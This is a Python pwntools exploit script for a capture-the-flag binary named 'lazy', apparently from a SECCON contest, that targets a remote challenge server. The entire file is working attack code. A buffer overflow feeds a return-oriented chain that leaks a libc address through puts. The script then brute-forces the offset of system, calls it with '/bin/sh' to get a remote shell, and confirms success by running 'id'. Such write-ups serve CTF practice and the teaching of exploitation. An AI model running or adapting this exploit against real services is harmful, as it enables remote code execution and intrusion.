from pwn import *
# context.log_level = 'debug'

TARGET = './lazy'
HOST = 'lazy.chal.seccon.jp'
PORT = 33333

# r = process(TARGET)
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})

elf = ELF(TARGET)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

login = 0x040126e
rdi = 0x004015f2+1
rsi_pop1 = 0x004015f1 

for i in range(0x3f00, 0x5000):
    print "trying offset: ", hex(i*0x10)
    r = remote(HOST, PORT)
    r.sendlineafter('Exit', '2')
    r.sendlineafter(' : ', 'A'*90)
    payload = 'A'*90
    payload += 'B'*46
    payload += p64(rdi)
    payload += p64(elf.got['__libc_start_main'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.sym['main'])
    r.sendlineafter(' : ', payload)
    r.recvuntil('username\n')
    leak = u64(r.recvuntil('\n')[:-1].ljust(8, '\x00'))
    dbg("leak")
    try:
        assert leak > 0x7e0000000000
    except:
        i -= 1
        continue
    base = leak - 0x20640
    dbg("base")
    binsh = base + 0x163c38
    system = base + i*0x10

    r.sendlineafter('Exit', '2')
    r.sendlineafter(' : ', 'A'*90)
    payload = 'A'*90
    payload += 'B'*46
    payload += p64(rdi)
    payload += p64(binsh)
    # payload += p64(elf.got['__libc_start_main'])
    payload += p64(system)
    try:
        r.sendlineafter(' : ', payload)
        sleep(0.1)
        r.sendline('id')
        x = r.recvrepeat(0.5)
        if 'uid' in x:
            break 
        r.close()
    except:
        r.close()

r.interactive()
r.close()
